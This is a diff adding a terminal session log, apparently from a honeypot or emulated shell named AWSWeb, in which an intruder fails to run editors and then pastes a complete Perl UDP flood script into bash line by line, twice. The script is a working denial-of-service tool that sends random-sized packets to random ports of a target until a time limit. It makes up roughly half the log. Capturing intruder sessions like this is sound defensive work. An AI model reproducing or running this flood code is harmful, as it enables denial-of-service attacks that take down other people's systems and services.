@@ -1,0 +1,185 @@
+[4hAWSWeb:~# nano
+bash: nano: command not found
+AWSWeb:~# nano[1D[1P[1D[1P[1D[1P[1D[1Papt-get install nano
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  nano 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 581.2kB of archives.
+After this operation, 1278.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main nano 1.17-4 [581.2kB]
+Fetched 581.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking nano (from .../archives/nano_1.17-4_i386.deb) ...
+Processing triggers for man-db ...
+Setting up nano (1.17-4) ...
+[4hAWSWeb:~# nano dos.pl
+[4lnano: Segmentation fault
+[4hAWSWeb:~# nano
+[4lnano: Segmentation fault
+[4hAWSWeb:~# sudo nano
+bash: sudo: command not found
+AWSWeb:~# sudo
+bash: sudo: command not found
+AWSWeb:~# su
+[4l[4hAWSWeb:~# r[1D[1Psudo apt-get install nano
+bash: sudo: command not found
+AWSWeb:~# k[1D[1Papt-get i[1D[1Pupdate
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# su aptg-[1D[1P[1D[1P0ge[1D[1P[1D[1P[1D[1P-get
+[4l[4hAWSWeb:~# 
+AWSWeb:~# su apt-get update
+[4l[4hAWSWeb:~# a[t[1D[1P[1D[1Pt[1D[1Ppt-geti[1D[1P indet[1D[1P[1D[1P[1D[1Pstall nano
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  nano 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 215.2kB of archives.
+After this operation, 473.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main nano 0.13-1 [215.2kB]
+Fetched 215.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking nano (from .../archives/nano_0.13-1_i386.deb) ...
+Processing triggers for man-db ...
+Setting up nano (0.13-1) ...
+[4hAWSWeb:~# nano
+[4lnano: Segmentation fault
+[4hAWSWeb:~# unst[1D[1Pet LANG
+[4l[4hAWSWeb:~# nano
+[4lnano: Segmentation fault
+[4hAWSWeb:~# te[1D[1P[1D[1Pgedit
+bash: gedit: command not found
+AWSWeb:~# aptp[1D[1P-get install gedit
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  gedit 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 122.2kB of archives.
+After this operation, 268.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main gedit 1.39-9 [122.2kB]
+Fetched 122.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking gedit (from .../archives/gedit_1.39-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up gedit (1.39-9) ...
+[4hAWSWeb:~# gedit
+[4lgedit: Segmentation fault
+[4hAWSWeb:~# #!/usr/bin/perl
+bash: #!/usr/bin/perl: command not found
+AWSWeb:~# 
+AWSWeb:~# ##############
+bash: ##############: command not found
+AWSWeb:~# # illegal things.
+bash: #: command not found
+AWSWeb:~# ##############
+bash: ##############: command not found
+AWSWeb:~# 
+AWSWeb:~# use Socket;
+bash: use: command not found
+AWSWeb:~# use strict;
+bash: use: command not found
+AWSWeb:~# 
+AWSWeb:~# my ($ip,$port,$size,$time) = @ARGV;
+bash: my: command not found
+AWSWeb:~# 
+AWSWeb:~# my ($iaddr,$endtime,$psize,$pport);
+bash: my: command not found
+AWSWeb:~# 
+AWSWeb:~# $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+bash: $iaddr: command not found
+AWSWeb:~# $endtime = time() + ($time ? $time : 1000000);
+bash: $endtime: command not found
+AWSWeb:~# socket(flood, PF_INET, SOCK_DGRAM, 17);
+bash: socket(flood,: command not found
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# print "Flooding $ip " . ($port ? $port : "random") . " port with " .
+bash: print: command not found
+AWSWeb:~#   ($size ? "$size-byte" : "random size") . " packets" .
+bash: ($size: command not found
+AWSWeb:~#   ($time ? " for $time seconds" : "") . "\n";
+bash: ($time: command not found
+AWSWeb:~# print "Break with Ctrl-C\n" unless $time;
+bash: print: command not found
+AWSWeb:~# 
+AWSWeb:~# for (;time() <= $endtime;) {
+bash: for: command not found
+bash: time(): command not found
+bash: ): command not found
+AWSWeb:~#   $psize = $size ? $size : int(rand(1024-64)+64) ;
+bash: $psize: command not found
+AWSWeb:~#   $pport = $port ? $port : int(rand(65500))+1;
+bash: $pport: command not found
+AWSWeb:~# 
+AWSWeb:~#   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}\[1D[1P
+bash: send(flood,: command not found
+bash: }: command not found
+AWSWeb:~# gksudo
+bash: gksudo: command not found
+AWSWeb:~# sudo
+bash: sudo: command not found
+AWSWeb:~# su nano
+[4l[4hAWSWeb:~# su gedit nan[1D[1P[1D[1P[1D[1Pdos.pl
+[4l[4hAWSWeb:~# su[1D[1P[1D[1Pgedit dos.pl
+[4lgedit: Segmentation fault
+[4hAWSWeb:~# #!/usr/bin/perl
+bash: #!/usr/bin/perl: command not found
+AWSWeb:~# 
+AWSWeb:~# ##############
+bash: ##############: command not found
+AWSWeb:~# # illegal things.
+bash: #: command not found
+AWSWeb:~# ##############
+bash: ##############: command not found
+AWSWeb:~# 
+AWSWeb:~# use Socket;
+bash: use: command not found
+AWSWeb:~# use strict;
+bash: use: command not found
+AWSWeb:~# 
+AWSWeb:~# my ($ip,$port,$size,$time) = @ARGV;
+bash: my: command not found
+AWSWeb:~# 
+AWSWeb:~# my ($iaddr,$endtime,$psize,$pport);
+bash: my: command not found
+AWSWeb:~# 
+AWSWeb:~# $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+bash: $iaddr: command not found
+AWSWeb:~# $endtime = time() + ($time ? $time : 1000000);
+bash: $endtime: command not found
+AWSWeb:~# socket(flood, PF_INET, SOCK_DGRAM, 17);
+bash: socket(flood,: command not found
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# print "Flooding $ip " . ($port ? $port : "random") . " port with " .
+bash: print: command not found
+AWSWeb:~#   ($size ? "$size-byte" : "random size") . " packets" .
+bash: ($size: command not found
+AWSWeb:~#   ($time ? " for $time seconds" : "") . "\n";
+bash: ($time: command not found
+AWSWeb:~# print "Break with Ctrl-C\n" unless $time;
+bash: print: command not found
+AWSWeb:~# 
+AWSWeb:~# for (;time() <= $endtime;) {
+bash: for: command not found
+bash: time(): command not found
+bash: ): command not found
+AWSWeb:~#   $psize = $size ? $size : int(rand(1024-64)+64) ;
+bash: $psize: command not found
+AWSWeb:~#   $pport = $port ? $port : int(rand(65500))+1;
+bash: $pport: command not found
+AWSWeb:~# 
+AWSWeb:~#   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
